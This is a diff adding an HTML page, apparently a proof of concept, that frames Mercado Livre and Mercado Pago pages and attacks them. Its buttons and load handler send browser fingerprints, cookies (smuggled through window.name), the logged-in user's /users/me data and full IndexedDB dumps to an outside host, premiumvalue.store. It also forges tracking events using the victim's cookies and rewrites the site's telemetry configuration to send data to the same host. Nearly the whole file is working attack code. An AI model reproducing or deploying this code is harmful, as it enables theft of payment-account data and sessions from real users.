@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Navegação Forçada V2.1 - Coleta e Hijack</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    #painel {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      width: 100%;
+      background: #000;
+      color: white;
+      padding: 10px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #painel button {
+      padding: 8px 12px;
+      font-size: 14px;
+      background: #ffcc00;
+      border: none;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+      border-radius: 6px;
+    }
+
+    iframe {
+      position: absolute;
+      top: 90px;
+      left: 0;
+      width: 100%;
+      height: calc(100% - 90px);
+      border: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="painel">
+    <button onclick="navegar('https://www.mercadopago.com.br/home')">🏠 Início</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/banking/balance')">💰 Saldo</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/money-out/transfer/pix-methods')">⚡ Pix</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/cards/cards-listing')">💳 Cartões</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/hub-engine/hubs/my-data')">📇 Meus Dados</button>
+    <button onclick="tentarExfiltrarDadosAPI()">📤 Coleta /users/me</button>
+    <button onclick="exfiltrarWindowName()">🧠 Via window.name</button>
+    <button onclick="coletarFingerprint()">🆔 Fingerprint</button>
+    <button onclick="extrairIndexedDB()">📁 IndexedDB</button>
+    <button onclick="hijackMelidata()">🎯 Hijack Melidata</button>
+  </div>
+
+  <iframe id="iframeML" src="https://www.mercadolivre.com.br/"></iframe>
+
+  <script>
+    const iframe = document.getElementById("iframeML");
+    let rotaAtual = "";
+    let inicio = null;
+
+    function navegar(url) {
+      rotaAtual = url;
+      inicio = Date.now();
+      iframe.src = url;
+      spoofTrack(url);
+    }
+
+    iframe.onload = () => {
+      const tempo = Date.now() - inicio;
+      fetch("https://premiumvalue.store/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          rota: rotaAtual,
+          tempoCarregamento: tempo,
+          agente: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        })
+      });
+    };
+
+    function spoofTrack(path) {
+      const payload = {
+        tracks: [{
+          path,
+          type: "view",
+          user_local_timestamp: new Date().toISOString(),
+          server_id: crypto.randomUUID(),
+          id: crypto.randomUUID(),
+          user: {
+            uid: "spoofed-uid",
+            user_tags: [],
+            privacy_consents: {
+              advertising: true,
+              traceability: true,
+              performance: true,
+              functionality: true
+            },
+            melidata_session_id: "spoofed-session"
+          },
+          event_data: {
+            spoof: true,
+            forced_navigate: true,
+            spoofed_url: path
+          },
+          platform: {
+            http: {
+              cookies: document.cookie,
+              headers: {
+                host: new URL(path).hostname,
+                "x-request-id": crypto.randomUUID(),
+                "x-d2id": "spoofed-uid",
+                "x-device-js": "true",
+                "x-platform": "ml"
+              },
+              http_url: path,
+              http_referer: document.referrer
+            }
+          },
+          application: {
+            sdk_version: { node_version: "6.12.0", js_version: "0.6.14" },
+            version: "2.10.1",
+            business: "mercadopago",
+            site_id: "MLB",
+            technologies: ["nordic"]
+          },
+          device: {
+            resolution_height: window.innerHeight,
+            resolution_width: window.innerWidth,
+            platform: "/web/desktop",
+            user_agent: navigator.userAgent
+          }
+        }]
+      };
+
+      fetch("https://api.mercadolibre.com/tracks", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        credentials: "include"
+      });
+    }
+
+    function tentarExfiltrarDadosAPI() {
+      fetch("https://api.mercadolibre.com/users/me", {
+        credentials: "include"
+      })
+      .then(r => r.json())
+      .then(data => {
+        fetch("https://premiumvalue.store/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ tipo: "user_info", data })
+        });
+      })
+      .catch(() => {});
+    }
+
+    function exfiltrarWindowName() {
+      const dados = {
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        ts: Date.now()
+      };
+      iframe.contentWindow.name = JSON.stringify(dados);
+      iframe.src = "https://premiumvalue.store/poc/fallback?event=window_name_leak";
+    }
+
+    function coletarFingerprint() {
+      const fp = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth
+        },
+        plugins: Array.from(navigator.plugins).map(p => p.name)
+      };
+      fetch("https://premiumvalue.store/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ tipo: "fingerprint", fp })
+      });
+    }
+
+    async function extrairIndexedDB() {
+      if (!indexedDB || !indexedDB.databases) return;
+
+      const dbs = await indexedDB.databases();
+      const resultado = [];
+
+      for (const db of dbs) {
+        const req = indexedDB.open(db.name);
+        req.onsuccess = () => {
+          const connection = req.result;
+          const dump = { name: db.name, objectStores: {} };
+
+          Array.from(connection.objectStoreNames).forEach(storeName => {
+            const tx = connection.transaction(storeName, "readonly");
+            const store = tx.objectStore(storeName);
+            const items = [];
+
+            store.openCursor().onsuccess = event => {
+              const cursor = event.target.result;
+              if (cursor) {
+                items.push(cursor.value);
+                cursor.continue();
+              } else {
+                dump.objectStores[storeName] = items;
+                fetch("https://premiumvalue.store/log", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ tipo: "indexeddb", dump })
+                });
+              }
+            };
+          });
+        };
+      }
+    }
+
+    function hijackMelidata() {
+      try {
+        window.melidata_namespace = {
+          config: {
+            melidata_internal_admin_public_url: "https://premiumvalue.store/poc",
+            melidata_internal_admin_url: "https://premiumvalue.store/poc",
+            melidata_internal_admin_url_test_url: "https://premiumvalue.store/poc",
+            melidata_api_url: "https://premiumvalue.store/poc",
+            melidata_pixel_url: "https://premiumvalue.store/poc",
+            enable_to_send: true,
+            log_level: "enabled",
+            retry_on_error_time: 1000,
+            retry_on_error_limit: 5
+          },
+          sendTrack: function(data) {
+            fetch("https://premiumvalue.store/poc", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ tipo: "melidata_hijack", data })
+            });
+          }
+        };
+        console.log("🎯 Hijack Melidata executado.");
+      } catch (e) {
+        console.warn("❌ Falha ao hijackear melidata.");
+      }
+    }
+  </script>
+
+</body>
+</html>
